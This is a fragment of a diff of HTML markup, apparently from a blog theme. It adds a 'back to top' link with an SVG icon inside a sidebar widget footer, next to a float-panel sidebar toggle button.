class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
